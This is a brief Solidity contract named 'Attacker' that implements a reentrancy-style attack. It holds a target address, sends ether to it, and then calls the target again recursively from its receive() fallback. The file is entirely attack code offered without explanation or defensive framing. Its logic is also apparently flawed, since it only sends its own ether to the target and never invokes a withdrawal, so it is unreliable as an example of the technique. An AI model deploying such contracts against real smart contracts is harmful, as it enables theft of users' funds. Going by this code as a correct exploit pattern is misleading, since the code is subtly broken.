// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    address public target;
    bool public attackStarted;

    constructor(address _target) {
        target = _target;
    }

    function initiateAttack() external payable {
        attackStarted = true;
        (bool success, ) = target.call{value: 1 ether}("");
        require(success, "Initial call failed");
    }

    receive() external payable {
        if (attackStarted) {
            (bool success, ) = target.call{value: 1 ether}("");
            require(success, "Recursive call failed");
        }
    }
}
